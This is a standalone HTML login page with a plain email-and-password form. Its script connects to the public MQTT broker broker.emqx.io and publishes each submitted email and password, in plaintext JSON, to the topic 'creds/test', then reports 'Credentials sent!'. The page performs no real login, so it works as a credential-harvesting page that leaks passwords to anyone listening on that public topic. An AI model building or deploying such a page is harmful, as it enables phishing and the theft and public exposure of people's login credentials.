<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f3f3f3;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        #login-wrapper {
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.15);
            width: 350px;
            padding: 24px;
            text-align: center;
        }
        h2 {
            margin-bottom: 1rem;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 12px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 1rem;
        }
        button {
            width: 94%;
            padding: 12px;
            margin-top: 10px;
            font-size: 1rem;
            border: none;
            background: #0070f3;
            color: white;
            border-radius: 6px;
            cursor: pointer;
        }
        button:hover {
            background: #005bb5;
        }
        #status {
            margin-top: 15px;
            color: green;
            font-weight: 600;
        }
    </style>
</head>
<body>
    <div id="login-wrapper">
        <h2>Login</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email" required />
            <input type="password" id="password" placeholder="Password" required />
            <button type="submit">Login</button>
        </form>
        <div id="status"></div>
    </div>

    <!-- MQTT.js -->
    <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
    <script>
        const client = mqtt.connect('wss://broker.emqx.io:8084/mqtt');

        client.on('connect', function () {
            console.log("Connected to MQTT broker.");
            document.getElementById('status').innerText = "Connected to MQTT broker.";
        });

        client.on('error', function (err) {
            console.error("MQTT connection error:", err);
            document.getElementById('status').innerText = "MQTT connection error.";
        });

        document.getElementById('loginForm').addEventListener('submit', function (e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            client.publish('creds/test', JSON.stringify({
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            }));

            document.getElementById('status').innerText = "Credentials sent!";

            // Optional: clear inputs
            this.reset();
        });
    </script>
</body>
</html>
